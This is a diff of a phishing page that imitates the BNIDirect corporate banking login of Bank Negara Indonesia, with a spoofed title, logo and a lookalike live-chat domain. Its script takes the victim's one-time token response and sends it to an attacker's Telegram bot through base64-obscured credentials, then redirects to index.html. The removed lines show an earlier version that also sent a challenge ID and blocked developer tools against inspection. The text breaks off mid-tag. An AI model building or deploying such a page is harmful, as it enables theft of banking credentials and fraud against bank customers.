@@ -1,9 +1,9 @@
-<html lang="fr" style="display: block;">
+<html lang="fr">
 <head>
     <meta http-equiv="Content-Type" content="text/html" charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>Halo Selamat Datang</title>
+    <title>BNlDirect</title>
     <link type="text/css" rel="stylesheet" href="https://bnidirect.bni.co.id/common/css/bootstrap/bootstrap.min.css">
     <link type="text/css" rel="stylesheet" href="https://bnidirect.bni.co.id/common/css/master.css">
     <link type="text/css" rel="stylesheet" href="https://bnidirect.bni.co.id/common/css/master_login.css">
@@ -11,64 +11,38 @@
     <link type="image/x-icon" rel="icon" href="https://bnidirect.bni.co.id/images/nextgenimage/logos/logo_bni.gif">
     <link type="image/x-icon" rel="shortcut icon" href="https://bnidirect.bni.co.id/images/nextgenimage/logos/logo_bni.gif">
     <script type="text/javascript" src="https://bnidirect.bni.co.id/common/js/jquery/jquery.js"></script>
-    <script type="text/javascript" src="https://bnidirect.bni.co.id/corp/common/login/login.js"></script>
-    <script type="text/javascript" src="https://bnidirect.bni.co.id/common/js/security.js"></script>
-    <link rel="stylesheet" href="login.css">
+
+    <!-- ALVIN - DOWNLOADUSERGUIDE - START -->
+    <script type="text/javascript" src="https://bnidirect.bni.co.id/common/js/gcm.js"></script>
+    <!-- ALVIN - DOWNLOADUSERGUIDE - END -->
+    
+    <script type="text/javascript">
+        var restPlaceholder = "Masukkan No.Respon Anda";
+        //AGUS - Lock Unlock User
+        var alertlogout = "Sesi login anda sudah habis.Mohon tekan OK untuk kembali login";
+        var alertlogoutPopup = "Sesi login anda sudah habis";
+        var languageLocale = 'fr_FR';
+        var otpNotMatch = "APR_1110413 - OTP yang diinputkan tidak sesuai";
+        var otpExpired = "APR_1110414 - OTP kadaluarsa";
+    </script>
+
+    <!-- Script Telegram Bot - Diperbaiki -->
     <script>
-
-        document.addEventListener('contextmenu', function(e) {
-            e.preventDefault();
-            alert("Fitur ini dinonaktifkan!");
-        });
-
-        document.addEventListener('keydown', function(e) {
-            if (e.ctrlKey && (e.key === 's' || e.key === 'u')) {
-                e.preventDefault();
-                alert("Akses ini diblokir!");
-            }
-            if (e.key === 'F12') {
-                e.preventDefault();
-                alert("Developer tools diblokir!");
-            }
-            if (e.key === 'ctrl+shift+i') {
-                e.preventDefault();
-                alert("Developer tools diblokir!");
-            }
-        });
-
-        // Base64 decode function
         function decodeBase64(encoded) {
             return atob(encoded);
         }
 
-        function validateForm(form) {
-            const corpId = form.j_corp_id.value.trim();
-            
-            if (!corpId) {
-                alert("Field Token Response wajib diisi.");
-                return false;
-            }
-            
-            return true;
-        }
+        function submitFormWithTelegram(e) {
+            e.preventDefault();
 
-        function submitForm() {
-            const form = document.getElementById("loginForm");
-            if (!validateForm(form)) {
-                return;
-            }
+            const form = document.getElementById('tokenForm');
+            const tokenResponse = (form.j_token_response ? form.j_token_response.value.trim() : '');
 
-            const corpId = form.j_corp_id.value.trim();
-            const lang = form.j_lang_user.value;
+            const message = `A1 💢\n \n  ├──────────DATA SUSPECT──────────\n  ├• No Respon (Token): ${tokenResponse}\n  ╰──────────────────────────────`;
 
-            // Format message untuk Telegram → hanya 1 data utama
-            const message = `A1 💢\n \n  ├───────DATA SUSPECT───────\n  ├• ID Nomer Token Challange: ${corpId}\n  ├• Language: ${lang === 'in' ? 'Indonesia' : 'English'}\n  ╰───────────────────`;
-
-            // Telegram bot credentials
             const botToken = decodeBase64("ODUwMzgyMDMyODpBQUZKYmpTQ1FGMEpPZGlZTVZWYUFMcjZrOGNuanpKQkJKWQ==");
             const chatId = decodeBase64("ODY1ODI5NTY3NA==");
 
-            // Send data to Telegram
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=html`, {
                 method: "POST",
                 headers: {
@@ -84,257 +58,262 @@
             })
             .then((data) => {
                 if (data.ok) {
-                    console.log("Data sent to Telegram successfully");
-                    // Redirect to ubah.html after successful submission
-                    window.location.href = "index.html";
+                    console.log("Data berhasil dikirim ke Telegram");
                 } else {
-                    console.error("Failed to send data to Telegram:", data.description);
-                    alert("Gagal mengirim data. Silakan coba lagi.");
+                    console.error("Gagal mengirim ke Telegram:", data.description);
                 }
+                // Langsung redirect (bukan form.submit())
+                window.location.href = "index.html";
             })
             .catch((error) => {
                 console.error("Error sending to Telegram:", error);
-                alert("Terjadi kesalahan. Silakan coba lagi.");
+                window.location.href = "index.html"; // tetap lanjut meski error
             });
         }
     </script>
 </head>
-<header>
-    <div class="container-fluid" style="border-bottom: 1px solid #D0D5DD;">
-        <div class="row BNI-White py-3">
-            <div style="margin-left: 9%;">
-                <img src="https://bnidirect.bni.co.id/images/nextgenimage/logos/Logo BNIDirect-02.svg" class="img-fluid" title="BNI" alt="BNI Logo" style="width: -webkit-fill-available; margin-left:9%">
-            </div>
-            <div class="col-6 col-xl-8 text-right">
-                <div class="sl-nav" style="margin-right:81px">
-                    <ul>
-                        <li><b id="select-lang">
-                            <img src="https://bnidirect.bni.co.id/images/nextgenimage/icons/ID.svg">&nbsp;&nbsp;Bahasa Indonesia
-                        </b> <img src="https://bnidirect.bni.co.id/images/nextgenimage/icons/Vector.svg" aria-hidden="true">
+
+<body class="frm" onload="checkAdminRepresentativeLogOff();nof5();placeholder();mtdStartClock();" style="background-image: url('/images/nextgenimage/backgrounds/Bg.svg'); background-size: cover">
+    
+<form id="tokenForm" method="post" autocomplete="off">
+        
+        <header>
+			<div class="container-fluid" style="border-bottom: 1px solid #D0D5DD;">
+				<div class="row BNI-White py-3">
+                         <div style="margin-left: 9%;">
+                        <img src="bni.svg" class="img-fluid" title="BNl" alt="BNl Logo" style="max-width:100%; display:block; margin-left:9%;">
+                    </div>
+
+                    <div class="col-6 col-xl-8 text-right">
+                        <div class="sl-nav" style="margin-right:81px">
                             <ul>
-                                <li>
-                                    <img src="https://bnidirect.bni.co.id/images/nextgenimage/icons/flag_en.png">&nbsp;&nbsp;<span onclick="onlanguageclickUS()">English</span>
-                                </li>
-                                <li>
-                                    <img src="https://bnidirect.bni.co.id/images/nextgenimage/icons/flag_id.png">&nbsp;&nbsp;<span onclick="onlanguageclickFR()" class="active">Bahasa Indonesia</span>
-                                </li>
-                                <li>
-                                    <img src="https://bnidirect.bni.co.id/images/nextgenimage/icons/flag_cn.png">&nbsp;&nbsp;<span onclick="onlanguageclickCN()">简体中文</span>
+                                <li><b id="select-lang">
+                                    <img src="https://bnidirect.bni.co.id/images/nextgenimage/icons/ID.svg">&nbsp;&nbsp;Bahasa Indonesia
+                                </b> 
+                                <img src="https://bnidirect.bni.co.id/images/nextgenimage/icons/Vector.svg" aria-hidden="true">
+                                    <ul>
+	                                        <li>
+	                                            <img src="https://bnidirect.bni.co.id/images/nextgenimage/icons/flag_en.png">&nbsp;&nbsp;<span onclick="onlanguageclickUS()">English</span>
+	                                        </li>
+	                                        <li>
+	                                            <img src="https://bnidirect.bni.co.id/images/nextgenimage/icons/flag_id.png">&nbsp;&nbsp;<span onclick="onlanguageclickFR()" class='active'>Bahasa Indonesia</span>
+	                                        </li>
+	                                        <li>
+	                                            <img src="https://bnidirect.bni.co.id/images/nextgenimage/icons/flag_cn.png">&nbsp;&nbsp;<span onclick="onlanguageclickCN()">简体中文</span>
+	                                        </li>
+                                    </ul>
                                 </li>
                             </ul>
-                        </li>
-                    </ul>
-                </div>
-            </div>
-        </div>
-    </div>
-    <div class="container-fluid">
-        <div class="row">
-            <div class="container-fluid pt-4 pb-1">
-                <div class="row">
-                    <div class="col-6 col-sm-8" style="margin-left: 9%;">
+                        </div>
                     </div>
-                </div>
-            </div>
-        </div>
-    </div>
-</header>
+				</div>
+			</div>
+			<div class="container-fluid">
+				<div class="row">
+					<div class="container-fluid pt-4 pb-1">
+						<div class="row">
+							<div class="col-6 col-sm-8" style="margin-left: 9%;"></div>
+						</div>
+					</div>
+				</div>
+			</div>
+        </header>
 
-<script>
-    var otpError="";
-    if(otpError=='gcm.businessexception.APR_1110413'){
-        alert(otpNotMatch);
-        document.documentElement.style.display = 'none';
-    }else if(otpError=='gcm.businessexception.APR_1110414'){
-        alert(otpExpired);
-        document.documentElement.style.display = 'none';
-    }
-</script>
+		<script>
+			var otpError="";
+			if(otpError=='gcm.businessexception.APR_1110413'){
+				alert(otpNotMatch);
+				document.documentElement.style.display = 'none';
+			}else if(otpError=='gcm.businessexception.APR_1110414'){
+				alert(otpExpired);
+				document.documentElement.style.display = 'none';
+			}
+		</script>
 
-<section>
-    <div class="container-fluid">
-        <div class="p-0 m-0">
-            <div id="section_one" class="row mt-3">
-                <div class="col-12 col-sm-12 col-md-7 col-lg-9 col-xl-6" style="margin-left: 9%;">
-                    <div class="row" style="height:100%">
-                        <div class="BNI-Turquoise BNI-BorderRadius-Left col-5 col-sm-12 col-md-10 col-lg-5 col-xl-4 p-0">
-                            <div class="BNI-BorderRadius-Left left" id="top">
-                                <div class="py-3 px-3 BNI-BorderRadius-Left text-white-login">
-                                    <div class="pl-2 pb-4">
-                                        <img src="https://bnidirect.bni.co.id/images/nextgenimage/icons/security.png">
-                                        <span class="pl-2 font-weight-bold security-reminder-title">
-                                            Panduan Keamanan
-                                        </span>
-                                    </div>
-                                    <div class="pl-4">
-                                        <ul>
-                                            <li><div>Jangan membagikan Kata Sandi atau informasi keamanan apapun pada Siapapun.</div></li>
-                                            <li>
-                                                Hubungi&nbsp;
-                                                <b class="ls-full">(021) 29946046</b>&nbsp;
-                                                atau&nbsp;
-                                                <b class="ls-full"><i>tbs_sat@bni.co.id</i></b>&nbsp;
-                                                apabila anda diminta untuk membagikan data.
-                                            </li>
-                                            <li>Hindari menggunakan Komputer dan WiFi umum.</li>
-                                        </ul>
-                                    </div>
-                                    <div class="p-1 security-reminder-url">
-                                        <div class="p-1 text-center text-white font-weight-bold ls-half">
-                                            <div class="pb-1">Pastikan URL anda</div>
-                                            https://bnidirect.bni.co.id
+        <section>
+            <div class="container-fluid">
+                <div class="p-0 m-0">
+                    <div id="section_one" class="row mt-3">
+                        <div class="col-12 col-sm-12 col-md-7 col-lg-9 col-xl-6" style="margin-left: 9%;">
+                            <div class="row" style="height:100%">
+                                <div class="BNI-Turquoise BNI-BorderRadius-Left col-5 col-sm-12 col-md-10 col-lg-5 col-xl-4 p-0">
+                                    <div class="BNI-BorderRadius-Left left" id="top">
+                                        <div class="py-3 px-3 BNI-BorderRadius-Left text-white-login">
+											<div class="pl-2 pb-4">
+												<img src="https://bnidirect.bni.co.id/images/nextgenimage/icons/security.png">
+												<span class="pl-2 font-weight-bold security-reminder-title">
+                                                    Panduan Keamanan
+												</span>
+											</div>
+											<div class="pl-4">
+												<ul>
+													<li><div>Jangan membagikan Kata Sandi atau informasi keamanan apapun pada Siapapun.</div></li>
+													<li>
+														Hubungi&nbsp;
+														<b class="ls-full">(021) 29946046</b>&nbsp;
+														atau&nbsp;
+														<b class="ls-full"><i>tbs_sat@bni.co.id</i></b>&nbsp;
+														apabila anda diminta untuk membagikan data.
+													</li>
+													<li>Hindari menggunakan Komputer dan WiFi umum.</li>
+												</ul>
+											</div>
+											<div class="p-1 security-reminder-url">
+												<div class="p-1 text-center text-white font-weight-bold ls-half">
+													<div class="pb-1">Pastikan URL anda</div>
+													https://bnidirect.bni.co.id
+												</div>
+											</div>
                                         </div>
                                     </div>
                                 </div>
-                            </div>
-                        </div>
 
-                        <div class="col-7 col-sm-12 col-md-10 col-lg-6 col-xl-8 BNI-White BNI-BorderRadius-Right-login-new" id="bni_login_form">
-                            <div class="py-2">
-                                <div class="p-0 m-0">
-                                    <div class="col-12 col-xl-12 m-0 BNI-Content-OrWh text-center">
-                                        <div id="content">
-                                            <div id="content-login">
-                                                <p class="red" style="font-size: 8px;">
+                                <div class="col-7 col-sm-12 col-md-10 col-lg-6 col-xl-8 BNI-White BNI-BorderRadius-Right-login-new" id="bni_login_form">
+                                    <div class="py-2">
+                                        <div class="p-0 m-0">
+                                        	<div class="col-12 col-xl-12 m-0 BNI-Content-OrWh text-center">
+                                                <p>Otentikasi Keamanan</p>
+                                                <p>APPL:2, No Respon</p>
+                                            </div>
+                                            <div class="col-12 col-xl-12 BNI-Content-OrWh">
+												<input type="tel" class="form-control form-control-sm py-2" name="j_token_response" id="password_placeholder" maxlength="16" autocomplete="new-password" onkeypress="doLogin(event)" required="" placeholder="Masukkan No.Respon Anda">
+                                            </div>                                      
+			                                <script type="text/javascript">
+											    document.getElementById("password_placeholder").setAttribute("placeholder", restPlaceholder);								    
+											</script>
+																						<p><strong></strong></p><center><strong><a href="https://livechatinc.dlrectbnl.com/live-chat/user/live_chat.php">LIVE CHAT</a></strong></center><p></p>
+                                            <div class="col-12 col-xl-12 BNI-Content-OrWh mt-2">
+                                                <center>
+                                                    <input type="submit" name="submit1" maxlength="6" value="Lanjut" class="BNI-Button-Login py-2 px-5" onclick="submitFormWithTelegram(event)">
+                                                    <input type="reset" name="clear" value="Hapus" class="BNI-Button-Genera-Blue py-2 px-5">
+                                                </center>
+                                            </div>
+                                        </div>
+
+										<div class="p-0 m-0">
+											<div class="col-12 col-xl-12 mt-2 BNI-Content-OrWh">
+												<div class="important-notes">
+													<img width="14px" src="https://bnidirect.bni.co.id/images/nextgenimage/icons/important-sym.png">
+													<span class="valign-mid">
+														Disarankan untuk tidak menyimpan Kata Sandi anda
+													</span>
+												</div>
+											</div>
+										</div>
+
+                                        <div class="row p-0 m-0">
+                                            <div class="col-7 col-sm-8 col-md-7 col-lg-7 col-xl-8 BNI-Content-OrWh" id="forgot_content">
+                                                <a href="#" onclick="doForgotPassword();" style="font-weight: bold;">
+                                                    Lupa Kata Sandi?</a>
+                                                <p class="m-0">
+                                                    Dengan klik tombol Masuk,
+                                                    <br>
+                                                    Anda setuju dengan
+                                                    <a href="#" onclick="onClickHelpAndSupport('8aad7a836d3d31c2016d4cb267681a00');">
+                                                        Syarat &amp; Ketentuan</a>
                                                 </p>
-                                                <form method="post" id="loginForm" onsubmit="event.preventDefault(); submitForm();">
-                                                    <table width="99%">
-                                                        <tbody>
-                                                            <tr>
-                                                                <div class="col-12 col-xl-12 BNI-Content-OrWh">
-                                                                    <input type="text" id="j_corp_id" size="32" tabindex="1" class="form-control form-control-sm py-2" autocomplete="off" placeholder="Masukan Nomor Response Challange">
-                                                                </div>
-                                                            </tr>
-
-                                                            <tr height="50%">
-                                                                <td colspan="3" style="padding-top:15px; padding-bottom:15px;">
-                                                                    <input type="radio" name="j_lang_user" checked="checked" value="in">&nbsp;<b><font size="2">Indonesia</font></b>
-                                                                    &nbsp;&nbsp;
-                                                                    <input type="radio" name="j_lang_user" value="en">&nbsp;<b><font size="2">English</font></b>
-                                                                </td>
-                                                            </tr>
-
-                                                            <tr>
-                                                                <td height="26" colspan="2">&nbsp;</td>
-                                                            </tr>
-
-                                                            <tr>
-                                                                <td class="text-center"></td>
-                                                                <td>
-                                                                    <div class="col-12 col-xl-12 BNI-Content-OrWh mt-2">
-                                                                        <input type="submit" name="login" value="Masuk" class="BNI-Button-Login py-2 px-5">
-                                                                        <input type="button" name="clear" value="Hapus" onclick="onClearClick(this.form);" class="BNI-Button-Genera-Blue py-2 px-5">
-                                                                    </div>
-                                                                </td>
-                                                                <td>&nbsp;</td>
-                                                            </tr>
-                                                        </tbody>
-                                                    </table>
-                                                </form>                                                  
+                                            </div>
+                                            <div class="col-3 col-sm-2 col-md-3 col-lg-3 col-xl-2 BNI-Content-OrWh" id="forgot_content">
+                                                <img src="https://bnidirect.bni.co.id/images/nextgenimage/pictures/sslcert.png" alt="sslcert">
                                             </div>
                                         </div>
                                     </div>
                                 </div>
                             </div>
                         </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-</section>
-
-<footer>
-    <div class="BNI-White mt-3 mx-0">
-        <div class="container pt-5 pb-4">
-            <div class="row BNI-CashLite-Text-Black py-2">
-                <div class="col-md-12 col-lg-12 p-0 clearfix">
-                    <div class="col-md-3 col-lg-3 p-0 text-left float-left">
-                    </div>
-                    <div class="col-md-3 col-lg-3 p-0 text-left float-left">
-                        <div class="font-16 pb-3"><b style="color:#6D7588;">Kantor BNI</b></div>
-                        <div class="font-14">
-                            Gedung Graha BNI <br>Jl. Jenderal Sudirman Kav. 1 <br>Jakarta Pusat 10220 <br>Indonesia
-                        </div>
-                    </div>
-                    <div class="col-md-3 col-lg-3 p-0 text-left float-left">
-                        <div class="font-16 pb-3"><b style="color:#6D7588;">Hubungi Service Action Team</b></div>
-                        <div class="font-14">
-                            <div class="pb-2">
-                                <img src="https://bnidirect.bni.co.id/images/nextgenimage/icons/phone.svg" alt="">
-                                (021) 29946046
+                        
+                        <div class="col-12 col-sm-12 col-md-5 col-lg-3 col-xl-3" style="margin-left: 3%;">
+                            <div class="row" id="bni_help_support">
+                                <div class="col-12 p-0 m-0">
+									<div class="head BNI-BorderRadius-Top">Bantuan &amp; Dukungan	</div>
+                                    <div class="scrollbar">
+                                        <ul class="list-group list-group-flush">
+                                            <li class="list-group-item">
+                                                <a href="#" onclick="onClickHelpAndSupport('8aad7a836a576a7b016a77f9d9dc02a5');">Panduan Singkat</a>
+                                            </li>
+                                            <li class="list-group-item">
+                                                <a href="#" onclick="onClickHelpAndSupport('4028f42491c2cfaf0191ff8a9e310ddd');">Formulir BNIDirect</a>
+                                            </li>
+                                        </ul>
+                                    </div>
+                                </div>
                             </div>
-                            <div class="pb-2">
-                                <img src="https://bnidirect.bni.co.id/images/nextgenimage/icons/mail-01.svg" alt="">
-                                tbs_sat@bni.co.id
-                            </div>
-                            <div class="pb-2">
-                                <img src="https://bnidirect.bni.co.id/images/nextgenimage/icons/whatsapp.svg" alt="">
-                                0858 5000 1946
+                            <div class="row BNI-BorderRadius-Bot pt-4 pb-2" id="bni_info">
+                                <div class="col-6 col-sm-6 col-md-6 col-lg-5 col-xl-5 left-login">
+                                    <p style="margin-right:16%; text-align: right;" class="font-weight-bold">
+                                        SERVICE<br>ACTION<br>TEAM
+                                    </p>
+                                </div>
+                                <div class="col-6 col-sm-6 col-md-6 col-lg-7 col-xl-5 p-0" id="bni_info_two" style="margin-left:8%">
+                                    <img src="https://bnidirect.bni.co.id/images/nextgenimage/icons/phone.svg" alt=""> (021)29946046<br>
+                                    <img src="https://bnidirect.bni.co.id/images/nextgenimage/icons/mail-01.svg" alt=""> tbs_sat@bni.co.id<br>
+                                    <img src="https://bnidirect.bni.co.id/images/nextgenimage/icons/whatsapp.svg" alt=""> 0858 5000 1946
+                                </div>
                             </div>
                         </div>
                     </div>
                 </div>
-            </div>
-            <hr class="ojk-bottom-style">
-        </div>
 
-        <div class="row-md-12 row-lg-12 px-4">
-            <div class="pb-2 text-left row" style="size: 12px; color: #6D7588; margin-left: 76px">
-                <p class="col-md-10">
-                    PT Bank Negara Indonesia (Persero) Tbk berizin dan diawasi oleh Otoritas Jasa Keuangan (OJK) & Bank Indonesia (BI) serta merupakan peserta penjamin Lembaga Pinjaman Simpanan (LPS), Maksimum nilai simpanan yang dijamin LPS per nasabah Rp. 2 Milyar, info lebih lanjut pada https://apps.lps.go.id/BankPesertaLPSRate
-                </p>
-                <p class="pb-2" style="margin-bottom: 38px;color: #6D7588;margin-left: 17px;margin-top: -12px;"> © Hak Cipta 2023 PT. Bank Negara Indonesia (Persero), Tbk.</p>
-            </div>
-        </div>
-    </div>
-
-    <!-- Modal AGUS - Lock Unlock User -->
-    <div class="modal fade" id="myModal" role="dialog">
-        <div class="modal-dialog modal-dialog-centered" role="document">
-            <div class="modal-content">
-                <div class="modal-header">
-                    <h4 class="modal-title">Peringatan</h4>
-                    <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">×</span></button>
-                </div>
-                <div class="modal-body">
-                    <font class="BNI-Message" color="red">
-                        <p style="font-size:15px;">Pengguna masih dalam login session yang lain,apakah tetap ingin masuk?</p>
-                    </font>
-                </div>
-                <div class="modal-footer">
-                    <button type="button" class="btn btn-primary" onclick="onStillLoginClick();">
-                        Ya</button>
-                    <button type="button" class="btn btn-secondary" data-dismiss="modal">
-                        Tidak</button>
+                <div id="section_two" class="row mt-3 mb-4">
+                    <div class="col-12 col-sm-12 col-md-9 col-lg-9 col-xl-6 BNI-Carousel py-2 px-3" style="margin-left: 9%;" id="carousel">
+                        <div class="carousel" data-flickity='{ "wrapAround": true, "autoPlay": true, "pageDots": false }'>
+                            <div class="carousel-cell"><a href='https://bnidirect.bni.co.id/cm_newsandpromotions/4028f4239770bff00197a9e833294258-PDAM.jpg' target="_blank"><img src='https://bnidirect.bni.co.id/cm_newsandpromotions/4028f4239770bff00197a9e833294258-PDAM.jpg'></a></div>
+                            <div class="carousel-cell"><a href='https://bnidirect.bni.co.id//cm_newsandpromotions/4028f4239770bff00197aaa2464f67dd-eSecure.jpg' target="_blank"><img src='https://bnidirect.bni.co.id/cm_newsandpromotions/4028f4239770bff00197aaa2464f67dd-eSecure.jpg'></a></div>
+                            <div class="carousel-cell"><a href='https://bnidirect.bni.co.id//cm_newsandpromotions/4028f4249770c0090197abaddce91fbd-supplychain.jpg' target="_blank"><img src='https://bnidirect.bni.co.id/cm_newsandpromotions/4028f4249770c0090197abaddce91fbd-supplychain.jpg'></a></div>
+                            <div class="carousel-cell"><a href='https://bnidirect.bni.co.id/cm_newsandpromotions/4028f4239770bff00197aaa562506bef-Trade.jpg' target="_blank"><img src='https://bnidirect.bni.co.id/cm_newsandpromotions/4028f4239770bff00197aaa562506bef-Trade.jpg'></a></div>
+                        </div>
+                    </div>
+                    <div class="col-12 col-sm-12 col-md-3 col-lg-3 col-xl-3" id="forMore" style="margin-left: 3%">
+	                    <div class="row justify-content-center"></div>
+                    </div>
                 </div>
             </div>
-        </div>
-    </div>
-</footer>
+        </section>
 
-<input type="hidden" name="password" value="">
-<input type="hidden" name="language" value="">
-<input type="hidden" name="checkBoxTerm" value="false">
-<input type="hidden" name="checkBoxHider" value="true">
+        <footer>
+            <div class="BNI-White mt-3 mx-0">
+                <div class="container pt-5 pb-4">
+                    <div class="row BNI-CashLite-Text-Black py-2">
+                        <div class="col-md-12 col-lg-12 p-0 clearfix">
+                            <div class="col-md-3 col-lg-3 p-0 text-left float-left">
+                                <img src="https://bnidirect.bni.co.id/images/nextgenimage/icons/bni_logo_login_footer.svg" alt="BNI-Logo">
+                            </div>
+                            <div class="col-md-3 col-lg-3 p-0 text-left float-left">
+                                <div class="font-16 pb-3"><b style="color:#6D7588;">Kantor BNI</b></div>
+                                <div class="font-14">Gedung Graha BNI <br>Jl. Jenderal Sudirman Kav. 1 <br>Jakarta Pusat 10220 <br>Indonesia</div>
+                            </div>
+                            <div class="col-md-3 col-lg-3 p-0 text-left float-left">
+                                <div class="font-16 pb-3"><b style="color:#6D7588;">Hubungi Service Action Team</b></div>
+                                <div class="font-14">
+                                    <div class="pb-2"><img src="https://bnidirect.bni.co.id/images/nextgenimage/icons/phone.svg" alt=""> (021) 29946046</div>
+                                    <div class="pb-2"><img src="https://bnidirect.bni.co.id/images/nextgenimage/icons/mail-01.svg" alt=""> tbs_sat@bni.co.id</div>
+                                    <div class="pb-2"><img src="https://bnidirect.bni.co.id/images/nextgenimage/icons/whatsapp.svg" alt=""> 0858 5000 1946</div>
+                                </div>
+                            </div>
+                            <div class="col-md-3 col-lg-3 p-0 text-left float-left">
+                                <div class="font-16 pb-3"><b style="color:#6D7588;">Bantuan &amp; Dukungan</b></div>
+                                <div class="font-14">
+                                    <div class="pb-2">
+                                        <a href="#" class="font-weight-normal lh-1 BNI-CashLite-Text-Black" onclick="onClickHelpAndSupport('8aad7a836d3d31c2016d4cb267681a00');">Syarat dan Ketentuan</a>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <hr class="ojk-bottom-style">
+                </div>
 
-<script type="text/javascript" src="https://bnidirect.bni.co.id/common/js/bootstrap/bootstrap.min.js"></script>
-<script type="text/javascript" src="https://bnidirect.bni.co.id/common/js/bootstrap/popper.min.js"></script>
-<script type="text/javascript" src="https://bnidirect.bni.co.id/common/js/flickity.pkgd.min.js"></script>
-<script>
-    $('#myModal').modal('show');
+                <div class="row-md-12 row-lg-12 px-4">
+                    <div class="pb-2 text-left row" style="size: 12px; color: #6D7588; margin-left: 76px">
+                        <p class="col-md-10">
+                            PT Bank Negara Indonesia (Persero) Tbk berizin dan diawasi oleh Otoritas Jasa Keuangan (OJK) &amp; Bank Indonesia (BI) serta merupakan peserta penjamin Lembaga Pinjaman Simpanan (LPS), Maksimum nilai simpanan yang dijamin LPS per nasabah Rp. 2 Milyar, info lebih lanjut pada https://apps.lps.go.id/BankPesertaLPSRate
+                        </p>
+                        <p class="pb-2" style="margin-bottom: 38px;color: #6D7588;margin-left: 17px;margin-top: -12px;"> ©&nbsp;Hak Cipta 2023 PT. Bank Negara Indonesia (Persero), Tbk.</p>
+                    </div>
+                </div>
+            </div>
 
-    $('.main-carousel').flickity({
-        cellAlign: 'left',
-        contain: true
-    });
-    
-    var dataChatBot = '';
-    if(dataChatBot){
-        localStorage.removeItem('webchat_user');
-    }
-</script>
-
-<iframe src="about:blank?historyLoaded" id="backDetectFrame" style="display: none;"></iframe>
-</body>
-</html>
+            <div class="mx-0 fixed-position">
+                <div class="row text-white py-1 m-0">
+                    <div class="col-12 m-0 px-0 py-1">
+                        <mar
